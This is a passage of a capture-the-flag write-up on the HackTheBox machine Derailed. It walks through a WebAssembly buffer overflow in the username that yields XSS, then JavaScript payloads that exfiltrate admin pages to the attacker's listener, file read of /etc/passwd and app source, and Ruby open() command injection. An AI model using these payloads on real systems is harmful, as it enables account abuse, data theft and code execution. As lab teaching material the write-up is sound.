---
title: HTB: Derailed
url: https://0xdf.gitlab.io/2023/07/22/htb-derailed.html
date: 2023-07-22T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, hackthebox, htb-derailed, nmap, ruby, rails, debian, ffuf, idor, xss, wasm, webassembly, javascript, bof, wasm-bof, pattern-create, command-injection, cors, chatgpt, python, file-read, open-injection, open-injection-ruby, openmediavault, sqlite, git, hashcat, chisel, deb, deb-package, youtube, htb-investigation, htb-pikaboo, htb-onetwoseven
---

![Derailed](/img/derailed-cover.png)

Derailed starts with a Ruby on Rails web notes application. I’m able to create notes, and to flag notes for review by an admin. The general user input is relatively locked down as far as cross site scripting, but I’ll find a buffer overflow in the webassembly that puts the username on the page and use that to get a XSS payload overwriting the unfiltered date string. From there, I’ll use the administrator’s browser session to read an admin page with a file read vulnerability where I can get the page source, and abuse an open injection in Ruby (just like in Perl) to get execution. I’ll pivot uses using creds from the database. To get root, I’ll exploit openmediavault’s RPC, showing three different ways - adding an SSH key for root, creating a cron, and installing a Debian package. In Beyond Root, I’ll debug the webassembly in Chromium dev tools.

## Box Info

| Name | [Derailed](https://hackthebox.com/machines/derailed)  [Derailed](https://hackthebox.com/machines/derailed) [Play on HackTheBox](https://hackthebox.com/machines/derailed) |
| --- | --- |
| Release Date | [19 Nov 2022](https://twitter.com/hackthebox_eu/status/1593272791960272897) |
| Retire Date | 22 Jul 2023 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Derailed |
| Radar Graph | Radar chart for Derailed |
| First Blood User | 01:54:09[noknowthing noknowthing](https://app.hackthebox.com/users/832440) |
| First Blood Root | 03:51:55[xct xct](https://app.hackthebox.com/users/13569) |
| Creators | [irogir irogir](https://app.hackthebox.com/users/476556)  [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (3000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.190
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-19 12:41 EDT
Nmap scan report for 10.10.11.190
Host is up (0.027s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
oxdf@hacky$ nmap -p 22,3000 -sCV 10.10.11.190
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-19 12:42 EDT
Nmap scan report for 10.10.11.190
Host is up (0.026s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
3000/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: derailed.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.81 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye. The HTTP title is `derailed.htb`, which suggests that’s the domain name for the site.

Given the reference to a domain, I’ll check for any subdomains with `ffuf`, but not find any.

### Website - TCP 3000

#### Site

The site is a note taking application:

![image-20230719131233422](/img/image-20230719131233422.png)

Entering some data and clicking “Create New Clipnote” loads a page with a new note at `/clipnotes/109`, and provides what looks like an editor, but trying to type pops an error:

![image-20230719131547035](/img/image-20230719131547035.png)

I’ll create an account, and I can log in, and view other user’s notes. I’m still not able to edit notes.

#### Note Brute Force

I’ll look for other notes. There’s one with id 1, and then the rest I created in testing:

```

oxdf@hacky$ /opt/ffuf/ffuf -u http://10.10.11.190:3000/clipnotes/FUZZ  -w <( seq 0 150 ) -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.190:3000/clipnotes/FUZZ
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

1                       [Status: 200, Size: 6276, Words: 1255, Lines: 183, Duration: 258ms]
109                     [Status: 200, Size: 6282, Words: 1255, Lines: 183, Duration: 163ms]
110                     [Status: 200, Size: 6282, Words: 1255, Lines: 183, Duration: 173ms]
111                     [Status: 200, Size: 6282, Words: 1255, Lines: 183, Duration: 183ms]
:: Progress: [151/151] :: Job [1/1] :: 244 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

```

The first note doesn’t have anything useful, but does leak a username, alice:

![image-20230719131913086](/img/image-20230719131913086.png)

If these notes are meant to be private, this is an insecure direct object reference (IDOR) vulnerability. However, it’s not clear from the site if you should be able to access other another user’s notes or not.

#### Report

Each note has a reporting option in the menu at the top right of the note:

![image-20230719132020750](/img/image-20230719132020750.png)

Clicking leads to `/report/[note id]`, and presents a form to say what is in appropriate about the report:

![image-20230719132100028](/img/image-20230719132100028.png)

On entering some text and clicking submit, it says:

![image-20230719132130477](/img/image-20230719132130477.png)

I can check for XSS. Given that the contents submitted are not displayed back to me, this would be a blind XSS, and I’ll have to try payloads that would connect back to me. I’ll submit a handful, but nothing ever connects back to my system.

#### Tech Stack

The HTTP response headers show a `_simple_rails_session` cookie being set:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 19 Jul 2023 17:15:03 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: _simple_rails_session=x2NuIiQiQLMolcFbsR7eowDRVM9MIwZ0w3oqUvGjSnqxHpKWwZyMQYx6Q5f46D3qEKM97VyQ20M3eW%2Foz7zLIXw0NYiTeyVe3yH6lJgG3dkCJSsqmhA%2BmiLU1eAAi5VpOlCFc76ClZ2FhmJtDRSRDM0hgC2st3lv5s%2FguE%2BgaHP1KfrBAKWuwl%2BO7uaQGSZZfsqnCzF0OO4uRAbZgBQGO6NcbMtDjyZUX%2B6J5yVP1F3ddc6qc2F7JQy8s88GYkcSInqDlJshzAXAC1hKE5OAW%2FiO%2BMiXu9Cz8MEtxPc%3D--G7ZzG0292EkiwA%2BV--b8EsLlNDMOPy5z1hblk7Rw%3D%3D; path=/; HttpOnly; SameSite=Lax
X-Request-Id: 41f1bd78-7691-4a56-8075-7b567678f8c0
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Turbolinks-Location: http://derailed.htb:3003/
Link: </packs/js/application-135b5cfa2df817d08f14.js>; rel=preload; as=script; nopush
Vary: Accept
ETag: W/"06561df05430b6b99c6fbd385cb649fd"
Cache-Control: no-cache
X-Runtime: 0.009177
Expires: Wed, 19 Jul 2023 17:15:02 GMT
Content-Length: 4774

```

This suggests it’s a Rails application, a Ruby web framework. The client side work is using [Webpack](https://webpack.js.org/), a JavaScript framework (as can be seen in the browser dev tools):

![image-20230719161218431](/img/image-20230719161218431.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.190:3000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.190:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        9c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      153l      397w     5908c http://10.10.11.190:3000/register
302      GET        1l        5w       91c http://10.10.11.190:3000/logout => http://10.10.11.190:3000/
200      GET      144l      381w     5592c http://10.10.11.190:3000/login
404      GET       67l      181w     1722c http://10.10.11.190:3000/users
200      GET       67l      181w     1722c http://10.10.11.190:3000/404
200      GET        6l     1408w    77302c http://10.10.11.190:3000/js/vs/editor/editor.main.css
302      GET        1l        5w       96c http://10.10.11.190:3000/administration => http://10.10.11.190:3000/login
200      GET    11509l    21777w   211255c http://10.10.11.190:3000/css/styles.css
200      GET       54l      134w     1648c http://10.10.11.190:3000/js/scripts.js
200      GET        8l       29w    28898c http://10.10.11.190:3000/assets/favicon.ico
200      GET     7219l    79688w  1008873c http://10.10.11.190:3000/packs/js/application-135b5cfa2df817d08f14.js
200      GET      128l      341w     4774c http://10.10.11.190:3000/
200      GET       66l      165w     1635c http://10.10.11.190:3000/500
200      GET       67l      176w     1705c http://10.10.11.190:3000/422
404      GET        1l        3w       14c http://10.10.11.190:3000/cable
[####################] - 2m     30019/30019   0s      found:15      errors:0      
[####################] - 2m     30000/30000   200/s   http://10.10.11.190:3000/ 

```

There’s one new page of interest, `/administration`, that just returns a redirect back to `/login`. Visiting as even a logged in user returns to `/login`. I likely need some kind of admin account to access this.

#### /rails/info/routes

There’s also the `/rails/info/routes` path that [will print out all the routes](https://dpericich.medium.com/how-to-inspect-rails-routes-from-the-terminal-860b1aab1df4) for the application:

![image-20230719190546745](/img/image-20230719190546745.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

For each route, it shows the relative path on the webserver as well as the controller and function that it maps to.

`feroxbuster` didn’t detect it with my default wordlist because `/rails` returns a 404.

## XSS Against Admin

### XSS Fails

It seems like a cross-site scripting (XSS) attack is required here through the “report” form. There’s no signal that anything I send in the text for that form is reaching. I’ll try a bunch of different XSS payloads, but it is blind, and I never get a connection back.

It does seem likely that if the admin gets a report about a note, they will have to go view that note. I’m not able to get any tags to render in there either:

![image-20230719153138551](/img/image-20230719153138551.png)

The next thing I have control over is my name. I’ll register the name `0xdf<b>test</b>`, but that seems to be well escaped:

![image-20230719153239928](/img/image-20230719153239928.png)

### HTML / JS / Web Assembly

#### Username Client-Side Limitation

Without any progress on the XSS side, I’ll turn towards better understanding the website in hopes of identifying a vulnerability. The registration form has an interesting limit on the username field:

![image-20230719160823943](/img/image-20230719160823943.png)

Usernames are limited to 40 characters. If I try to put more than 40, it just clips it back to 40. However, this is done client-side, so it may be bypassable by editing the request sent to the server.

#### Editor Loader

When loading the page to show a note, it presents an editor but always in read-only mode. Looking at the source for this page, there’s JavaScript on the main page that handles the loading of the note (lines 85-133):

```

    <script>

        fetch('/clipnotes/raw/115')
            .then(response => response.json())
            .then(clipNote => {
                loadClipNote(clipNote)
            });

        function loadClipNote(clipNote) {

            window.clipNote = clipNote

            "use strict";
            let el = document.getElementById('editor');
            el.style.minHeight = '400px';

            let editor = null;

            require(['vs/editor/editor.main'], function () {

                editor = monaco.editor.create(el, {
                    theme: 'vs-light',
                    model: monaco.editor.createModel(clipNote.content, "markdown"),
                    readOnly: true,
                    fontSize: "18px",
                    roundedSelection: false,
                    scrollBeyondLastLine: false,
                });

                editor.layout();
            });

            // load some stats
            let author = clipNote.author
            let created = clipNote.created_at

            Module.ccall(
                "display",
                "number",
                ["string", "string"],
                [
                    created,
                    author
                ]
            );
        }
    </script>

```

It makes a request to `/clipnotes/raw/[note id]` and then passes the result to `loadClipNote`. That uses the content to make a new editor object in read only mode. At the end, there’s a function `ccall`.

`ccall` is a function in [Enscrypten](https://emscripten.org/), a compiler for WebAssembly that compiles C and C++ code into WebAssembly and connects it with JavaScript. The [docs](https://emscripten.org/docs/api_reference/preamble.js.html#ccall) show that `ccall` is for calling compiled C functions like this:

![image-20230719162410129](/img/image-20230719162410129.png)

That matches what’s in the code above, calling `display`, expecting back a number, passing in the `created` and `author` as strings. Looking more closely at the resources in use by the page, there is a `display.js` and a `display.wasm`:

![image-20230719162538793](/img/image-20230719162538793.png)

I can try to reverse this web assembly, but it’s not needed to continue. I’ll look at that in [Beyond Root](#beyond-root---debugging-webassembly).

### Buffer Overflow Filter Bypass

#### POC

Whenever I see arguments being passed to something written in C, I’ll want to check for a buffer overflow. I don’t have any control over the date string at this time, but I can control the username. Additionally, the fact that the client side is limiting usernames to 40 characters suggests that may have been put in as a safeguard (one that is easily bypassed).

To test this, I’ll use the Metasploit utility `pattern_create` to make a pattern that’s 60 bytes long:

```

oxdf@hacky$ pattern_create -l 60
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9

```

If I paste that into the form and submit, it will look successful. But then when I try to log in, it will fail. The POST request shows it clipped the name at 40 characters:

```

POST /register HTTP/1.1
Host: 10.10.11.190:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.190:3000/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 226
Origin: http://10.10.11.190:3000
Connection: close
Cookie: _simple_rails_session=gHj54UOx8IbX%2FqSpCwDHmJ9q2ARA402FSNrZNN%2F9hWlWlgpsLXPSKnlLZic%2FDUhnqMeQyniEuMF4rO6jFqoNEg4cRE4AX8zpjc7Ng3CSuSpl2t56BYyeEBepWmfCO9xjSx6WzSqeMHqElOgmKF2aKq7GhNZnjWos%2Bpq%2FQc7Bvw6NM%2BKkk9d10AJYRL55%2BrEWXW0BEOMYvteK%2FnyJspzKrLgwvYliW%2BxDEbSMTwHYl46e%2BBwyVE5vuI46yPg6eNPHNRTVBzbeS9%2BX56V%2B3N0m9YP5hwYQvYdsCyJ9YhY%3D--m4DyA1CWMxx4xt8c--jYNnQt7uEkgvoheMdUX1TQ%3D%3D
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

authenticity_token=cZpbLjuFfRDttgYXgtsIw28pwzQ4h0vJQiUGjg-Gg8KDSqacCMq-WjSg_8u2Z_Qm_3BpDsy6-qvQvkGDCt6xeA&user%5Busername%5D=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A&user%5Bpassword%5D=0xdf&user%5Bpassword_confirmation%5D=0xdf

```

Notice how that ends with `Ab2A` and not `8Ab9`. I’ll send that request to Burp Repeater, give it the full 60 character username, and send it. Then I can log in with that 60-character name.

Once logged in, I’ll create a note, it loads just fine, but I’ll note some odd behavior with the note metadata:

![image-20230719170704705](/img/image-20230719170704705.png)

The full username is there, and the created string is part of the username. In fact, it’s 48 bytes into the username:

```

oxdf@hacky$ pattern_offset -q Ab6A
[*] Exact match at offset 48

```

There must be some kind of unsafe copy that overwrites the date string with the end of the username string.

#### Filter Bypass

The next question is - given that the date string is likely assumed to be safe, is it being escaped? If not, perhaps I could get some XSS payload in there. I’ll register a username that’s 48 bytes of junk, followed by a simple `img` tag XSS POC payload that will generate an `alert`. It works:

![image-20230719171446623](/img/image-20230719171446623.png)

The full name is shown, escaped correctly. The “created” time is a failed image load, and the foreground has an alert popup with the message “1”!

### XSS POC

#### Better Payload - Part 1

For some reason, `script` tags in the username don’t load. I’ve shown that I can get a line of code running as part of the `onerror` in an image load (a very common XSS technique). I’ll build from there.

There’s a couple of workarounds to get code running nicely. I went for a method modeled off the `fetch` call in the legit page above. I’ll start with a simple `fetch` on my server with the username:

```

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/xss.js');" />

```

On logging in, submitting a note and viewing it, there’s a request at my server:

```
10.10.14.6 - - [19/Jul/2023 18:20:40] code 404, message File not found
10.10.14.6 - - [19/Jul/2023 18:20:40] "GET /xss.js HTTP/1.1" 404 -

```

I’ll create this file with some simple JavaScript in it:

```

oxdf@hacky$ echo "alert(1);" > xss.js 

```

On refreshing, it gets the file just file:

```
10.10.14.6 - - [19/Jul/2023 18:22:58] "GET /xss.js HTTP/1.1" 200 -

```

The next step is to try to use this file to do something. I’ll create this payload that will try to write the contents to the console:

```

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/xss.js').then(r => r.text()).then(t => {console.log(t)});" />

```

On logging out, registering, logging back in, and creating a note, there’s a hit at my server:

```
10.10.14.6 - - [19/Jul/2023 18:25:06] "GET /xss.js HTTP/1.1" 200 -

```

Unfortunately, the contents aren’t printed to the console, but there’s an error message:

![image-20230719182632064](/img/image-20230719182632064.png)

Despite the fact that it did fetch the file from my webserver, it then failed and blocked access to the results because of CORS. [This page](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors/CORSMissingAllowOrigin) talks about the error and what’s happening. It’s actually an issue that can be fixed at my server.

> If the server is under your control, add the origin of the requesting site to the set of domains permitted access by adding it to the `Access-Control-Allow-Origin` header’s value.
>
> For example, to allow a site at `https://example.com` to access the resource using CORS, the header should be:
>
> ```

> Access-Control-Allow-Origin: https://example.com
>
> ```

>
> You can also configure a site to allow any site to access it by using the `*` wildcard.

#### Custom Python Server

I need a server that will include that header. ChatGPT can write this for me:

![image-20230719183142609](/img/image-20230719183142609.png)

I’ll replace `Custom-Header` with `Access-Control-Allow-Origin` and `YourCustomHeaderValue` with `*`. I’ll also replace port 8000 with 80 (since I like working on 80, and I give Python in my hacking VM capability to listen on low ports without root).

I’ll start the server:

```

oxdf@hacky$ python serve.py 
Server started on port 80.

```

On refreshing the page, there’s a hit (it looks just like `python -m http.server` since I’m using that same module):

```
10.10.14.6 - - [19/Jul/2023 18:32:15] "GET /xss.js HTTP/1.1" 200 -

```

In the console, now instead of the error there’s the contents of the file in the console:

![image-20230719183430864](/img/image-20230719183430864.png)

#### Better Payload - Part 2

Having bypassed the CORS issue, I still want to see if I can load code from my server and run it. I’ll update my username by replacing `console.log(t)` with `eval(t)`:

```

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/xss.js').then(r => r.text()).then(t => {eval(t)});" />

```

If this works, there will be an alert window in the browser, and it will mean that I can simple update the local file and refresh, without having to logout, register, log back in, create a post, and view it. On doing that one last time, there’s a hit at my webserver and then an alert on the page:

![image-20230719183731818](/img/image-20230719183731818.png)

#### Remote POC

The plan is to submit this ticket to the admin for review. Getting a popup on their browser isn’t useful (and is counterproductive in the real world). I’ll update `xss.js` to just an empty file, and go through the process of reporting on of the posts made by this latest user. A few seconds later, there’s a hit on the webserver from Derailed:

```
10.10.11.190 - - [19/Jul/2023 18:43:09] "GET /xss.js HTTP/1.1" 200 -

```

This shows that the user on Derailed viewed the XSS note and it worked, meaning that I can run code in that user’s browser.

## Shell as rails

### Enumerating /administration

#### Fetch

I’m interested in seeing what `/administration` looks like. I’ll write a JavaScript payload that will fetch that and exfil it to me:

```

fetch('http://derailed.htb:3000/administration')
  .then(resp => resp.text())
  .then(html => { 
    fetch('http://10.10.14.6:9001/exfil', {
      method: "POST",
      body: html,
    })
  });

```

I’ll save this resubmit the note for review. I’ll start `nc` on port 9001 to capture the POST with the page in the body. After a minute, there’s a hit:

```

oxdf@hacky$ nc -lvnp 9001 > administration.html
Listening on 0.0.0.0 9001
Connection received on 10.10.11.190 32934

```

One thing to note that code me a bunch of time - The remote `fetch` won’t work on `http://10.10.11.190:3000` or `http://127.0.0.1:3000`. It has to go for `derailed.htb`. This is due to same origin policy. It will allow the request just like above, but then exit with an error just like I saw above. That same error will likely occur after the POST to my server, but at that point I don’t care, as I already have the exfil.

#### /administration

I’ll open the page in Firefox, and while the CSS doesn’t load, I can get a general feel for the page:

![image-20230719214906666](/img/image-20230719214906666.png)

The interesting part is the “Download” link. It’s actually part of an HTML form:

```

      <form method="post" action="/administration/reports">
        <input type="hidden" name="authenticity_token" id="authenticity_token" value="9mw2vcnB21eAXqYGuIdqD7awDeIu6rSXLLutK9YaTokG0BGxX9VU3bXFZCzLN4C8s7wL_VBFentQOBEHNCQL-Q" autocomplete="off" />
        <input type="text" class="form-control" name="report_log" value="report_19_07_2023.log" hidden>
        <label class="pt-4"> 19.07.2023</label>
        <button name="button" type="submit">
          <i class="fas fa-download me-2"></i>
          Download
        </button>
      </form>

```

Clicking the link will create a POST request to `/administration/reports`. In the POST body, it submits:
- `authenticity_token` - a hidden field with a token that changes on each request of the page, acts as a CSRF token.
- `report_log` - looks like a file name, also statically set in the page.

### File Read over XSS

#### Read report\_19\_07\_2023.log

I’ll craft a payload that will try to fetch the log file (the intended behaviour) over the XSS.

```

fetch('http://derailed.htb:3000/administration')
  .then(resp => resp.text())
  .then(html => {
    let page = new DOMParser().parseFromString(html, "text/html");
    let token = page.getElementById("authenticity_token").value;
    console.log(token);
    fetch('http://derailed.htb:3000/administration/reports', {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: "authenticity_token=" + token + "&report_log=report_19_07_2023.log",
    })
    .then(resp => resp.text())
    .then(html => {
      console.log(html);
      fetch('http://10.10.14.6:9001/', {
        method: "POST",
        body: html,
      })
    });
  })

```

This will read the `/administration` page, and get the token from it. Then it will send a POST to `/administration/reports` requesting the log file. The result will be sent back to me in a POST. After saving this, I’ll submit the report again, and the file hits my `nc` listening on 9001, with a log file showing the id of the note and the complaint about it:

```

oxdf@hacky$ nc -lvnp 9001
Listening on 0.0.0.0 9001                                           
Connection received on 10.10.11.190 38260                           
POST / HTTP/1.1                                                     
Host: 10.10.14.6:9001
Connection: keep-alive                                              
Content-Length: 402                                                 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/96.0.4664.45 Safari/537.36            
Content-Type: text/plain;charset=UTF-8                              
Accept: */*                                                         
Origin: http://derailed.htb:3000                                    
Referer: http://derailed.htb:3000/                                  
Accept-Encoding: gzip, deflate                                      
Accept-Language: en-US                                              
               
1,alice smells
1,<b>
143,aaa
143,sdfdsaf
143,asdasdasd
143,asdsad
143,asdasd
143,asdas
143,asdasd
143,asdasd
143,asdasd
143,asdas
143,asdasd
143,asd
143,asda
143,asdsadas
143,asdasdasd
143,sdffsd
143,sad
143,asdasd
143,asdas
143,asd
143,asd

```

#### File Read POC

It’s reasonable to think that perhaps this is trying to open a file named `report_19_07_2023.log`. I’ll update my payload to try to read a different file. `/etc/passwd` is always a good place to start. I’ll simply update the `report_log` parameter in the request, and the next time I submit the report, `passwd` arrives at `nc`:

```

oxdf@hacky$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.190 49876
POST / HTTP/1.1
Host: 10.10.14.6:9001
Connection: keep-alive
Content-Length: 2084
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/96.0.4664.45 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://derailed.htb:3000
Referer: http://derailed.htb:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:110::/nonexistent:/usr/sbin/nologin
postfix:x:104:111::/var/spool/postfix:/usr/sbin/nologin
_chrony:x:105:114:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
_rpc:x:106:65534::/run/rpcbind:/usr/sbin/nologin
proftpd:x:107:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:108:65534::/srv/ftp:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
statd:x:110:65534::/var/lib/nfs:/usr/sbin/nologin
avahi:x:111:115:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
openmediavault-webgui:x:999:996:Toby Wright,,,:/home/openmediavault-webgui:/bin/bash
admin:x:998:100:WebGUI administrator:/home/admin:/usr/sbin/nologin
openmediavault-notify:x:997:995::/home/openmediavault-notify:/usr/sbin/nologin
systemd-timesync:x:994:994:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:993:993:systemd Core Dumper:/:/usr/sbin/nologin
rails:x:1000:100::/home/rails:/bin/bash
_laurel:x:996:992::/var/log/laurel:/bin/false
marcus:x:1001:1002:,,,:/home/marcus:/bin/bash

```

#### Application Source

From the `/rails/info/routes` path, I have a list of the controllers and the function in them assigned to each path on the server. (Without this file I could retrieve this information from `config/routes.rb` in the application directory.)

There’s a [standard naming scheme](https://gist.github.com/iangreenleaf/b206d09c587e8fc6399e#controllers) for Rails application controllers:

> Controller *class names* use `CamelCase` and have `Controller` as a suffix. The `Controller` suffix is always singular. The name of the resource is usually **plural**.
>
> Controller *actions* use `snake_case` and usually match the standard route names Rails defines (`index`, `show`, `new`, `create`, `edit`, `update`, `delete`).
>
> Controller files go in `app/controllers/#{resource_name}_controller.rb`.

I expect to find the admin controller in `app/controllers/admin_controller.rb`. I don’t know the absolute path to the application, but I can use `/proc/self/cwd` to get there. I’ll update the POST body to `report_log=/proc/self/cwd/app/controllers/admin_controller.rb`. The source comes back:

```

class AdminController < ApplicationController
  def index
    if !is_admin?
      flash[:error] = "You must be an admin to access this section"
      redirect_to :login
    end

    @report_file = helpers.get_report_file()

    @files = Dir.glob("report*log")
    p @files
  end

  def create
    if !is_admin?
      flash[:error] = "You must be an admin to access this section"
      redirect_to :login
    end

    report_log = params[:report_log]

    begin
      file = open(report_log)
      @content = ""
      while line = file.gets
        @content += line
      end
      send_data @content, :filename => File.basename(report_log)
    rescue
      redirect_to request.referrer, flash: { error: "The report was not found." }
    end

  end
end

```

### Command Injection via Insecure Open

#### Background

I’ve shown a couple times the insecure manner in which Perl uses the `open` command (recently in [Investigation](/2023/04/22/htb-investigation.html#vulnerability-details), and before that as diamond injection in [Pikaboo](/2021/12/04/htb-pikaboo.html#exploit-cvsupdate)).

[This post](https://bishopfox.com/blog/ruby-vulnerabilities-exploits) from Bishop Fox shows how Ruby can be abused the same way. The above code shows that the contents of the `report_log` parameter are passed directly to `open`. Given that I control that, if I lead that file path with a `|`, it will execute what follows.

The details are also clear in the [Ruby docs](https://ruby-doc.org/core-2.1.0/Kernel.html#method-i-open):

> If `path` starts with a pipe character (`"|"`), a subprocess is created, connected to the caller by a pair of pipes. The returned [IO](https://ruby-doc.org/core-2.1.0/IO.html) object may be used to write to the standard input and read from the standard output of this subprocess.

#### POC

I’ll start with a simple `ping` by updating `report_log=|ping -c 1 10.10.14.6`. I’ll listen with `tcpdump`, and nn triggering this, there are ICMP packets:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:14:02.388656 IP 10.10.11.190 > 10.10.14.6: ICMP echo request, id 42664, seq 1, length 64
23:14:02.388688 IP 10.10.14.6 > 10.10.11.190: ICMP echo reply, id 42664, seq 1, length 64

```

In fact, because the result is POSTed to me, I can see them at `nc`:

```

oxdf@hacky$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.190 40358
POST / HTTP/1.1
Host: 10.10.14.6:9001
Connection: keep-alive
Content-Length: 257
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/96.0.4664.45 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://derailed.htb:3000
Referer: http://derailed.htb:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

PING 10.10.14.6 (10.10.14.6) 56(84) bytes of data.
64 bytes from 10.10.14.6: icmp_seq=1 ttl=63 time=93.8 ms
--- 10.10.14.6 ping statistics ---
